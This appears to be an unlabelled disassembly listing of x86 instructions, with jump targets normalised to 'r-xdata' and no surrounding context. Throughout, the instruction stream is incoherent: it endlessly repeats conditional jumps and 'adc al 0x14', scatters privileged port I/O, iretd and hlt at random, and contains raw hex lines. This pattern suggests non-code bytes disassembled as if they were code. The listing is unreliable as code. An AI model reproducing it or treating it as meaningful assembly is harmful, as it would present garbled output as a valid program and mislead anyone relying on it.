adc al 0x14
jpo r-xdata
and [ edx ] eax
xchg esi eax
jpo r-xdata
adc [ ebp + 0x602b9662 ] cl
adc cl [ ebp + 0x60299662 ]
adc eax 0x2f96628d
lea esp [ edx - 0x52 ]
or esi [ ebx + 0x628d8e81 ]
scasb [ edi ]
or [ ebx + 0x628da281 ] esi
scasb [ edi ]
btr [ edx ] eax
neg [ edi ]
adc al 0x14
in al 0x6e
or [ fs : esp + edx ] dl
rcr [ edx ] 0x6f
jpo r-xdata
jpo r-xdata
adc al 0x9e
unpcklps xmm7 [ edi + ecx * 2 - 0x15 ]
adc esp [ esi - 0x52 ]
jpo r-xdata
pushad
pop es
mov edx 0xe42802ba
jmp r-xdata
and [ esp + edx ] 0x16010214
adc al 0x14
jpo r-xdata
in al 0x6f
pushad
xor [ ebp - 0x7eb4499e ] ecx
cwde
adc al 0xd8
xor [ edx ] al
push 0x34
mov esp 0x14267902
adc al 0x7b
jpo r-xdata
jpo r-xdata
add ch al
sti
jmp r-xdata
in al 0x6f
bound ebp [ esi - 0x3efd4cf9 ]
jpo r-xdata
push 0x1502e72f
xor eax 0x7b7b1414
jpo r-xdata
out dx eax
mov eax 0x6e66b8b8
imul edx [ esi ] 0x14
adc al 0xbb
mov eax 0x14181602
adc al 0x7b
lea esp [ edx - 0x52 ]
aas
pushad
sub eax 0x3dae628d
pushad
sub [ ebp + 0x6033ae62 ] cl
sub cl [ ebp + 0x6031ae62 ]
sub eax 0x14125002
adc al 0x8d
jpo r-xdata
mov eax 0xbcbd2bd8
bound ebp [ esi + 0x1fae6217 ]
bound ebp [ esi + 0x29110213 ]
adc al 0x14
jpo r-xdata
outsd
scasb [ edi ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov esp 0x7c141360
jmp r-xdata
adc al 0x14
adc al 0x14
fdiv [ eax ]
add ch [ edx + 0x34 ]
jpo r-xdata
pop es
mov bl 0x2
shl [ ebx ] 0x14
jpo r-xdata
jpo r-xdata
outsb
and al [ edx ]
bound eax [ ebx ]
adc al 0x14
add ah [ edx + 0x27 ]
mov dh 0x47
mov al 0x8d
bound esi [ esi - 0x72677ebb ]
bound esp [ esi - 0x607e4dab ]
outsb
sbb eax 0x31646ee4
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
cmp [ ebp + 0x14379802 ] 0x760be14
push 0x8981db07
mov bl 0x81
lea esp [ edx - 0x6a ]
sub [ eax + 0x15 ] esp
lea esp [ edx - 0x6a ]
das
pushad
pop es
mov edx 0x14d8bcba
mov esp 0x1439d202
adc al 0x7b
in al 0x6f
call 0x7c32eb6c
jpo r-xdata
pop es
aaa
adc al 0x14
lea ebp [ esi + 0x1d ]
add dh [ esi + 0x7b14140f ]
jpo r-xdata
jpo r-xdata
add bh [ ecx + 0x26 ]
adc al 0x14
jpo r-xdata
and edx [ esp + edx ]
jpo r-xdata
add al cl
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ss [ edx ]
jpo r-xdata
add bh bl
jpo r-xdata
jpo r-xdata
jpo r-xdata
and edx [ esp + edx ]
jpo r-xdata
adc al 0x2
jpo r-xdata
jpo r-xdata
jpo r-xdata
call 0xffffffffe516cfbe
pop esp
sub edi [ ebx - 0x14fcd2a0 ]
sbb dl [ esp + edx ]
push 0xaf62e72f
iretd
pushad
mov esi 0xbaba0760
mov esp 0x2bc14d8
sar [ ecx ] cl
adc al 0x14
jpo r-xdata
adc al 0x7b
jpo r-xdata
mov ss [ esp + edx + 0x14 ]
add bh [ edx - 0x1e ]
jmp r-xdata
add ecx [ esi + 0x68141412 ]
das
out 0x6e eax
sub esp esp
outsd
adc al 0x14
push 0x2b6ee72f
in al 0x6f
jpo r-xdata
jpo r-xdata
mov eax [ 0x2141407 ]
outsd
rcr bh cl
cli
in al 0x6e
in eax 0xeb
jmp r-xdata
sti
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound edi [ esi - 0x72c59fcd ]
bound edi [ esi - 0x257e4ecf ]
add ah [ ebp + 0x7b141431 ]
bound esp [ esi - 0x519d72b3 ]
mov dl 0x1c
jpo r-xdata
sbb [ esp + edx ] edx
adc al 0x7b
jpo r-xdata
sub esi [ edx - 0x38fdcce4 ]
jpo r-xdata
adc al 0x9e
unpcklps xmm7 [ ebx ]
sub edi 0xebdbeb83
jmp r-xdata
jpo r-xdata
scasb [ edi ]
adc edi [ ebx + 0x50022d60 ]
aaa
adc al 0x14
jpo r-xdata
jmp r-xdata
xor eax [ edx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc ebp
pushad
and eax 0xebe67702
jmp r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
aas
adc al 0x14
jpo r-xdata
sbb al 0x33
jpo r-xdata
jpo r-xdata
test eax 0x31360bd
jpo r-xdata
sbb eax 0xae661414
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
outsd
jmp r-xdata
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jpo r-xdata
or ebx 0x33be628d
pushad
cmp cl [ ebp - 0x4ece419e ]
sbb edx 0x1431a502
adc al 0x7b
add al bh
jpo r-xdata
adc al 0x14
mov ebx 0x6083bd14
scasb [ edi ]
out 0xd0 eax
sub [ edx ] al
cdq
jmp r-xdata
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
test al 0x3f
pushad
jpo r-xdata
jmp r-xdata
sti
adc al 0x66
jpo r-xdata
jpo r-xdata
outsb
sbb eax 0x31186fe4
jpo r-xdata
adc al 0x7d
inc edi
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
ja r-xdata
outsb
mov dh 0x11
jpo r-xdata
mov eax 0xeb477d14
jmp r-xdata
mov ebx 0x16236e66
jpo r-xdata
mov ebx 0xebe7f903
jmp r-xdata
adc al 0x9e
pop ds
jpo r-xdata
adc al 0x7b
jpo r-xdata
add ebp [ eax + 0x214143f ]
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jpo r-xdata
adc al 0x14
jpo r-xdata
pushad
pop es
jpo r-xdata
lodsb [ esi ]
add [ esp + edx ] edx
jpo r-xdata
bound ebp [ esi - 0x62fd4cf5 ]
adc al 0x14
jpo r-xdata
jecxz r-xdata
adc [ esp + edx ] edx
cmp [ edx ] eax
inc ebx
jmp r-xdata
pushad
adc edx [ esp + edi * 2 ]
jpo r-xdata
jpo r-xdata
in al 0x6f
sub esp [ edx ]
adc al 0x14
add dh [ eax - 0x1e ]
jmp r-xdata
add bl [ esi + 0x14ebebeb ]
sahf
pop ss
xor [ esp + edx ] edx
lodsd [ esi ]
mov eax [ ebx ]
fstp [ edi ]
adc al 0x14
adc [ edi - 0x437e7346 ] 0x62
adc al 0x14
aas
jpo r-xdata
add cl [ ebx ]
sub al 0x14
add esp [ eax ]
mov ebx 0xe9ebed83
jpo r-xdata
fsubr [ ebx ]
push 0x6d62f32f
pop ds
jpo r-xdata
jg r-xdata
jpo r-xdata
push 0x2ebe796
adc [ edx ] eax
adc al 0x14
jpo r-xdata
fucomi st6
jpo r-xdata
scasb [ edi ]
jpo r-xdata
out dx eax
jmp r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
add ch [ esi + 0x7b14142e ]
jpo r-xdata
adc al 0xbc
lahf
add bh cl
aaa
adc al 0x14
jpo r-xdata
jpo r-xdata
bound edx [ esi + 0x31040205 ]
or ebp [ esp + edx ]
adc al 0x2
jpo r-xdata
in eax dx
jpo r-xdata
jmp r-xdata
adc al 0x68
or edi [ ecx ]
bound ebp [ ebp + 0x1f ]
jpo r-xdata
adc [ ebx - 0x72537e4f ] 0xb171be62
jpo r-xdata
scasb [ edi ]
pop ss
mov ebx 0x13683c14
0x26f06ee4 0x1414
jpo r-xdata
out 0xeb eax
jpo r-xdata
jpo r-xdata
xor [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
in al dx
jmp r-xdata
mov bl 0x2
jpo r-xdata
cmpsb [ esi ] [ edi ]
dec ebp
pushad
stosd [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax 0xbe7b1414
pushad
pop es
push 0x7
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
and [ 0xffffffffae661414 ] bl
jpo r-xdata
jmp 0xffffffffe84c04fa
jpo r-xdata
adc al 0x14
push edi
xor [ eax + 0x56 ] al
or esi [ ebx - 0x141362fe ]
jmp r-xdata
jpo r-xdata
sub ebp 0xffffffeb
jpo r-xdata
add dl [ ecx ]
add dl [ esp + edx ]
pushad
xor al 0x38
adc [ eax + 0x2d ] ch
jecxz r-xdata
adc al 0x7b
jpo r-xdata
popfd
fsubr [ ebx ]
add ch [ ecx + eax + 0x7b7b1414 ]
mov ebp 0xe42b6ea7
jpo r-xdata
adc al 0x7b
lds edx [ esp + edx ]
jpo r-xdata
adc al 0xbb
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub eax [ edx ]
xchg edi eax
aaa
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
out 0x63 eax
mov ebp 0xa8031360
jpo r-xdata
add al [ 0x7bebebe8 ]
jpo r-xdata
jpo r-xdata
add bl [ ebp + 0x60ebebec ]
scasd [ edi ]
iretd
jpo r-xdata
jmp r-xdata
jpo r-xdata
arpl [ edi + 0x15684cfe ] si

jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov esp 0x135f6e66
jmp r-xdata
outsd
outsb
sub esp esp
jpo r-xdata
adc al 0x14
jpo r-xdata
shr [ eax ] 0x1
jpo r-xdata
mov eax 0x142efc02
jpo r-xdata
outsd
push 0x2141422
jpo r-xdata
adc al 0x14
jpo r-xdata
loop r-xdata
jpo r-xdata
jecxz r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
mov edi 0xb8ebebe2
mov ebp 0x541b60bc
out dx eax
0x66bcebeb 0x5f6e
inc esp
add eax 0x7b7b1414
adc eax [ ebx ]
jpo r-xdata
mov [ ecx - 0x70529d44 ] es
add dl dl
adc al 0x14
jpo r-xdata
call 0x7bc2edfe
jpo r-xdata
sub eax [ edx ]
jmp r-xdata
jpo r-xdata
arpl bx sp
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
nop
in al 0x6f
jpo r-xdata
adc al 0x14
push cs
mov dh 0x28
jpo r-xdata
mov al 0x60
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x6f
jpo r-xdata
cld
jpo r-xdata
pushad
adc al 0x14
mov ch 0x2
mov eax 0x7bebebeb
jpo r-xdata
jpo r-xdata
mov esi 0x142dc902
adc al 0x7b
mov esi 0x76a0760
jmp r-xdata
popad
cmpsb [ esi ] [ edi ]
jmp r-xdata
cmc
jpo r-xdata
sar [ esi ] cl
mov esp 0x28fad62
jpo r-xdata
cmp [ edx - 0x2dfd7053 ] 0x7b14143e
lea esp [ edx - 0x6a ]
add eax 0x14310402
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
add eax 0x7bebebe8
jpo r-xdata
jpo r-xdata
out 0xeb eax
add esi ebp
adc edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
push 0x2402e929
push esi
jpo r-xdata
sub esp [ esi - 0x4f ]
cmp ebp [ eax + 0x10 ]
jpo r-xdata
mov ss [ ebx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
add ecx [ ebx ]
jpo r-xdata
lea ebp [ esi + 0x2b ]
in al 0x6f
jpo r-xdata
add al [ ebx + ecx ]
bound edi [ esi - 0x617e4e8f ]
bound ebp [ esi - 0x7d7e4ce7 ]
add bh [ ecx + eax + 0x7b7b1414 ]
adc al 0x14
bound ebp [ ebp + 0x3ed2028f ]
lea esp [ edx - 0x52 ]
sbb [ ebx - 0x43fd7d7f ] esi
add [ esp + edx ] edx
jpo r-xdata
lodsd [ esi ]
pop [ edx ]
xchg edi eax
bound edi [ esi - 0x699d728d ]
jpo r-xdata
pop ss
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
das
adc al 0x14
add edi edi
loope r-xdata
or [ ebp - 0x4ce6519e ] 0x8d
bound ebp [ esi + 0x28e811f ]
or al 0x35
adc al 0x14
jpo r-xdata
adc al 0x14
rol [ ebx ] 0x1
jpo r-xdata
mov cl 0x3b
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
sub ah ah
jpo r-xdata
jpo r-xdata
cmp [ esp + edx ] edx
jpo r-xdata
pushad
adc eax [ ecx + 0x7d14bc8f ]
jpo r-xdata
sub dl [ ds : esp + edx ]
add ch [ eax + 0x5 ]
adc al 0x14
jpo r-xdata
sub esp esp
jpo r-xdata
adc al 0x14
jpo r-xdata
add al 0x31
jpo r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
jae r-xdata
add al ch
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x14b830d8
outsb
pop edi
adc edx [ esp + edx ]
outsb
jpo r-xdata
jpo r-xdata
adc al 0x9e
unpcklps xmm7 [ edi + esi * 8 - 0x1494147d ]
mov al 0x28
jpo r-xdata
jpo r-xdata
jmp r-xdata
lahf
adc [ esp + edx ] dl
mov al 0x28
jpo r-xdata

add ebp [ esi + ebp ]
adc al 0x14
fcomp [ 0xffffffffb6022b6e ]
aaa
adc al 0x14
jpo r-xdata
push 0xd102e210
jpo r-xdata
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sti
or [ edi + 0x5b7d14bc ] 0xb8ebebeb
add al [ eax + 0x1b ]
adc al 0x14
jpo r-xdata
outsd
in al 0x6e
inc esp
out 0xeb eax
jmp r-xdata
mov edx 0x62bc818c
jpo r-xdata
cmp al 0x68
adc ebp edx
in al 0x6e
bound edx [ esi - 0x6c7e4b81 ]
mov cl 0x81
lodsb [ esi ]
lea esp [ edx - 0x42 ]
jno r-xdata
adc al 0x14
jpo r-xdata
cmp [ ecx + 0x628db38e ] eax
scasb [ edi ]
imul edx [ esi + 0x6ee4eafb ] 0x5d
add dl [ esp + edx ]
mov eax 0x16236e66
adc al 0x14
jpo r-xdata
lodsd [ esi ]
jpo r-xdata
jpo r-xdata
and [ esi ] 0xfffffffa
jmp 0x5049c23d
bound ebp [ ebp + 0x3afe03f7 ]
adc al 0x14
jpo r-xdata
jpo r-xdata
and edx [ esi ]
jpo r-xdata
loop r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add dh [ edx ]
sub [ esp + edx ] dl
jpo r-xdata
mov ebx 0xeb037c14
jpo r-xdata
scasb [ edi ]
cmp eax [ edx ]
call 0x7bc2f173
adc al 0xbd
out dx eax
mov esp 0x32d60bb
mov ah 0x37
adc al 0x14
push 0xee02fb2f
loop r-xdata
jpo r-xdata
cmp eax 0x14149c02
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
mov esp 0xeb5b7d14
jmp r-xdata
jpo r-xdata
scasb [ edi ]
cmp esp [ esi + 0x6e ]
imul edx [ esi ] 0x14
adc al 0xb8
mov ebx 0xebebd502
jmp r-xdata
sbb [ esi + 0x77be628d ] 0x1437e302
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc edx [ esp + edi * 4 ]
mov edi 0x6fe42b6e
or ebx [ esi ]
adc al 0x14
mov eax 0xae66ef81
aaa
mov ebx 0x6013ae60
imul ecx [ edi - 0x15 ] 0xffffffeb
jmp r-xdata
jpo r-xdata
pushad
adc al [ edx ]
stosd [ edi ]
push ebp
adc al 0x14
jpo r-xdata
jmp r-xdata
adc al 0xbb
adc al 0x7c
add ebp ebx
sub al 0xae
pop es
cwde
add edi esi
cmp dl [ esp + edx ]
adc [ edx + 0x14126b02 ] 0x817b7b14
adc al 0x14
jpo r-xdata
xchg esi eax
sti
0x25d6ee4 0x1414
test [ ebx ] 0x14143afe
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
outsb
jpo r-xdata
jpo r-xdata
and edx [ esi ]
outsb
jpo r-xdata
jl r-xdata
mov esp 0x206ae62
lds eax [ eax ]
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x16b76e66
jpo r-xdata
adc al 0x14
pushad
movsd [ edi ] [ esi ]
retn
pop ebx
adc al 0x7d
jpo r-xdata
jpo r-xdata
and esp [ esi + 0x6e ]
imul edx [ esi ] 0x14
adc al 0x2
adc edx [ esp + edx ]
adc al 0x60
jpo r-xdata
adc al 0x14
jpo r-xdata
sub eax [ edx ]
add al 0xb
bound ebp [ ebp + 0x1f ]
mov esp 0xeb2f5562
jmp r-xdata
adc [ edi + 0x30 ] 0x40
push esi
add ch dh
jge r-xdata
mov dl 0xd8
out dx al
jmp r-xdata
jpo r-xdata
jpo r-xdata
pop ss
mov ebx 0xafbd14b8
pushad
scasb [ edi ]
pop ss
add edx [ ecx + 0x66ebebe1 ]
jpo r-xdata
adc eax 0xebeaef83
jmp r-xdata
jpo r-xdata
or [ esi - 0x72787e4d ] 0xb31dae62
or [ ebp + 0x13ae628d ] 0x8dc581b3
bound ebp [ esi + 0x628db311 ]
scasb [ edi ]
cmp esi [ ebx + 0x39ae628d ]
or [ esi - 0x519d724d ] 0x8d2bd83f
bound edi [ esi - 0x519d72db ]
cmp eax 0x1fa6628d
jpo r-xdata
xchg esi eax
xor esp [ esi + 0x66 ]
pop ebx
push ss
adc al 0x14
add esi esi
loope r-xdata
jpo r-xdata
xchg edx eax
add ch [ ebx + 0x12 ]
adc al 0x14
jpo r-xdata
inc ebx
jmp r-xdata
jl r-xdata
mov ebx 0x2efc02b8
jpo r-xdata
push ss
adc al 0x7c
jae r-xdata
adc al 0x14
mov ebx 0x135f6e66
adc al 0x14
mov ebx 0x66c3bd14
adc al 0xb8
outsb
and edx [ esi ]
outsb
add bl dl
push ecx
adc al 0x14
mov edx 0x14312a02
adc al 0x7b
jpo r-xdata
jmp r-xdata
add ch [ edx ]
xor [ esp + edx ] edx
jpo r-xdata
xchg ecx eax
jpo r-xdata
jpo r-xdata
outsb
fsubr [ ebx ]
jpo r-xdata
pushad
lodsb [ esi ]
xor [ esp + edx ] edx
jpo r-xdata
mov ebx 0x23bae66
jmp r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
sub ecx ebp
add ah [ esi + edx * 2 ]
and eax 0x66661414
pop ebx
jmp r-xdata
loope r-xdata
jpo r-xdata
out dx eax
jpo r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
outsb
sub esp esp
outsb
and bh ch
jmp r-xdata
jmp r-xdata
add dh [ edx + 0x21 ]
adc al 0x14
jpo r-xdata
cdq
lea esp [ edx - 0x52 ]
add [ edx + 0x19ae628d ] 0xae628db3
pop ds
or [ esi + 0x14350c02 ] 0xb07b7b14
sub [ ebx + 0x7b ] bh
jmp r-xdata
adc al 0x14
add bh ah
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
pushad
call 0x146f37bb
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc al 0xbb
cmpsd [ esi ] [ edi ]
outsb
sub esp esp
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
stosd [ edi ]
jpo r-xdata
add edx [ esp + edx ]
add dl cl
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
mov ebx 0xd88fbd14
and ch [ eax + 0x13 ]
adc al 0xe4
jle r-xdata
push ss
outsb
scasb [ edi ]
adc al 0x7b
jpo r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
0x6e66ebeb 0x165b
sahf
out dx al
jmp r-xdata
in al 0x6e
outsb
outsb
cmp ecx [ ebp - 0x4ef0419e ]
or ebx 0x14555602
adc al 0xb8
mov eax 0x11576e66
adc al 0x14
punpckldq mm6 [ esi - 0xc43ebc9 ]
mov esp 0x14089902
adc al 0x7b
jpo r-xdata
outsd
xchg edi eax
mov ebx 0xe42b6ea7
pop ds
xchg si ax
jpo r-xdata
or [ esi + 0x21720287 ] 0x14
adc al 0x7b
jpo r-xdata
mov eax 0x142e6002
adc al 0x7b
mov ebx 0x9807ae2c
clc
jpo r-xdata
adc al 0x14
add bh al
sbb dl [ esp + edx ]
jpo r-xdata
outsb
mov bh 0x16
adc al 0x14
jpo r-xdata
lodsd [ esi ]

xchg esi eax
jpo r-xdata
in al 0x7e
sub ah [ eax + 0x12 ]
add ch [ ebx + 0x7b141455 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
aas
fsubr [ ebx ]
lea esp [ edx - 0x42 ]
and eax 0x3dae628d
lea esp [ edx - 0x5a ]
pop ds
mov bl 0x8d
jpo r-xdata
adc al 0x7b
jpo r-xdata
sub ebp [ ebx + 0x1413f802 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
add ebx eax
jpo r-xdata
sub edi 0xffffffea
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi - 0x4c717ec7 ]
lea esp [ edx - 0x52 ]
jpo r-xdata
jpo r-xdata
add bh al
add esi esi
jmp 0x6702f456
mov dl 0x8d
fsub st1
jmp r-xdata
jpo r-xdata
outsd
or [ esi + 0x14 ] bl
jpo r-xdata
sbb edx [ esp + edx ]
outsb
push edi
adc [ esp + edx ] edx
add dh [ eax + 0x38 ]
adc al 0x14
jpo r-xdata
loope r-xdata
push 0x2b6ee72f
add ch [ ecx + 0x17 ]
pop ss
fsubr [ ebx ]
lea esp [ edx - 0x52 ]
lds ecx [ ebp - 0x4cee519e ]
lea esp [ edx - 0x52 ]
jpo r-xdata
push 0xeaffcf97
in al 0x6e
arpl [ ebp + 0x14 ] dx
adc al 0x60
test al 0xfb
outsb
sub eax [ edx ]
clc
daa
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound esp [ esi + 0x60898111 ]
jmp r-xdata
push ss
adc al 0x14
adc al 0x14
pop bx
das
out 0x6e eax
sub eax [ edx ]
imul edx [ edi ] 0x7b7b1414
mov ebx 0xf5a85de4
test al 0xd3
pop esi
adc al 0x14
in al 0x5d
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
cmp esp esp
outsd
jpo r-xdata
lea ebp [ esi + 0x2b ]
in al 0x6f
jpo r-xdata
iretd
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc [ ecx - 0x72dc9f77 ] eax
bound esp [ esi - 0x72dd27e9 ]
bound esp [ esi - 0x1387fdeb ]
adc al 0xe4
jpo r-xdata
scasd [ edi ]
iretd
jpo r-xdata
mov ebx 0x60b39814
sub eax 0x14284402
adc al 0xe4
outsd
out dx eax
jmp r-xdata
test al 0xf5
sub eax 0x3eb14ae
imul cl
jmp r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x7d
pop es
pop esi
cmp edx [ esi ]
adc al 0x14
adc al 0xbc
sti
add dl [ ecx ]
push cs
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x6a ]
jpo r-xdata
xor ebp [ esi ]
adc al 0x14
add al [ ecx + 0x7b14142a ]
jpo r-xdata
sub esp esp
outsd
push 0x3d02c614
add [ esp + edx ] edx
0x55636ee4 0x1414
jpo r-xdata
jpo r-xdata
pop ebp
jpo r-xdata
adc al 0xaf
iretd
jpo r-xdata
adc al 0xeb
pop ebx
fstp [ eax + 0x3a03ed62 ]
adc al 0x9e
jmp r-xdata
in al 0x5c
test al 0xf7
pushad
scasb [ edi ]
adc esp [ edx - 0x52 ]
pop es
pushad
scasb [ edi ]
pop ds
mov [ ebp - 0x4cf6519e ] ecx
or [ edx + 0xfae628d ] 0x14573b02
adc al 0x60
xor cl [ ebp + 0x60a5b662 ]
pop ebp
xchg esi eax
jpo r-xdata
pushad
cmpsb [ esi ] [ edi ]
out 0x62 eax
0x3e7302b8 0x1414
bound edx [ esi + 0x14b8bb17 ]
mov ebp 0x17ae60af
bound ebp [ edi + 0x28d0f7cf ]
add ch [ esi ]
or edx [ esp + edx ]
jpo r-xdata
and ecx [ ebp - 0x27e8599e ]
and cl [ ebp + 0x215a662 ]
js r-xdata
pushad
scasb [ edi ]
cvtpi2ps xmm2 [ ebx ]
hlt
sar [ ebx - 0xa57a21c ] cl
jpo r-xdata
iretd
add bh [ 0x14141401 ]
lahf
adc al 0x6d
push edi
jmp r-xdata
adc dx [ esi ]
adc al 0x14
add esp [ ebp + 0x1b ]
adc al 0x14
dec edi
adc eax 0x2bd1414
salc
sbb [ esp + edx ] dl
mov ebx 0xebeea803
jmp r-xdata
lea ebp [ esi + 0x39 ]
in al 0x6f
xor al 0x8d
bound esi [ esi + 0xc0f02bb ]
adc al 0x14
lea esp [ edx - 0x52 ]
or eax 0x14037c02
adc al 0x7b
jpo r-xdata
pushad
jpo r-xdata
mov ebp 0xef8503bb
jmp r-xdata
daa
adc al 0x14
add [ eax - 0x4724a443 ] 0x62
insd
pop es
sbb [ edx - 0x4724a443 ] 0x62
in eax dx
and [ esi - 0x699d724c ] 0x3c3a0253
jpo r-xdata
adc al 0x14
jpo r-xdata
in al 0x5d
lea esp [ edx - 0x4a ]
mov ebx 0x140c0f02
adc al 0x8d
bound ebp [ esi + 0x37c020d ]
adc al 0x14
jpo r-xdata
adc esp [ edx - 0x52 ]
cmp esp [ esi - 0x52 ]
cmp edi [ ebx + 0x1405dd02 ]
adc al 0x7b
pushad
lodsd [ esi ]
fist [ esi + ebx * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ah 0x8d
jpo r-xdata
jpo r-xdata
jpo r-xdata
pop ebx
jpo r-xdata
lea esp [ edx - 0x42 ]
stosd [ edi ]
pushad
xor ebx eax
jpo r-xdata
bound edx [ esi + 0x3c3a0253 ]
bound ebp [ esi - 0x27d427e5 ]
cmp [ edx - 0x52 ] esp
pop ss
add dl [ eax + 0x7b141405 ]
jpo r-xdata
pushad
scasb [ edi ]
pop ss
bound ebp [ esi + 0x13ae6003 ]
bound ebp [ esi + 0x1fae6007 ]
in al 0x6e
dec edi
pop ds
adc al 0x14
mov ch 0x28
jpo r-xdata
jge r-xdata
add edi [ edx ]
0xb8db5bbd 0xed62
xor dh [ ecx + 0xdb6628d ]
lea esp [ edx - 0x6a ]
sbb eax 0x1401d202
adc al 0x7b
jpo r-xdata
cmp [ ecx - 0x499d7264 ] eax
jge 0x60f0c93d
mov esi 0xd83360ab
add edx [ ecx - 0x7e141411 ]
sti
scasb [ edi ]
adc al 0x9f
jpo r-xdata
adc al 0x14
mov ebx 0x145f7602
adc al 0x8d
jmp r-xdata
fsubr [ ebx ]
add al dh
adc al 0x14
jpo r-xdata
bound esp [ esi + 0x311d02cf ]
adc al 0x14
jpo r-xdata
jpo r-xdata
sahf
adc al 0x14
jpo r-xdata
jg r-xdata
jpo r-xdata
adc al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
lahf
pushad
jpo r-xdata
xlat
jpo r-xdata
jpo r-xdata
add [ esp + edx ] edx
jpo r-xdata
scasd [ edi ]
iretd
lea esp [ edx - 0x51 ]
jpo r-xdata
add [ ebx + esi * 4 + 0x628d9b81 ] 0xb3d7cfaf
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
out 0x2 eax
scasd [ edi ]
iretd
jpo r-xdata
or [ esi - 0x30509d73 ] 0x8581b3d5
jpo r-xdata
jpo r-xdata
bound edx [ edi + 0x3bdffcf ]
or bl ch
jmp r-xdata
lea esp [ edx - 0x5a ]
iretd
scasd [ edi ]
jpo r-xdata
mov bl 0x81
jpo r-xdata
jpo r-xdata
jpo r-xdata
sti
0x14f3cfaf 0xcfaf
lea esp [ edx - 0x51 ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
stosd [ edi ]
jpo r-xdata
fwait
lea esp [ edx - 0x51 ]
jpo r-xdata
0xcfaf628d 0xd8a9
bound ebp [ edi - 0x7e4c5431 ]
jpo r-xdata
jpo r-xdata
iretd
scasd [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc ecx
call 0x2faff711
out 0x66 eax
scasb [ edi ]
aas
mov ebx 0x14237002
adc al 0x7b
jpo r-xdata
bound ebp [ esi - 0x347e4cfb ]
bound ebp [ edi - 0x7e4c2831 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
aad 0xb3
jpo r-xdata
jpo r-xdata
jpo r-xdata
iretd
mov esp 0x9662b8bc
pop ss
adc al 0xbd
jmp r-xdata
iretd
jpo r-xdata
mov bl 0x81
jecxz r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
add [ ebp - 0x30509d73 ] 0xea81b3ab
lea esp [ edx - 0x51 ]
iretd
jpo r-xdata
add eax 0x8dcb81b3
jpo r-xdata
adc al 0xb2
outsb
sub esp esp
outsd
int1
jmp r-xdata
push ebp
aaa
adc al 0x14
mov dl 0x6e
add bl [ ecx + 0x7b14141d ]
push 0x7
or ebx 0x1bae628d
mov bl 0x81
into
mov bl 0x81
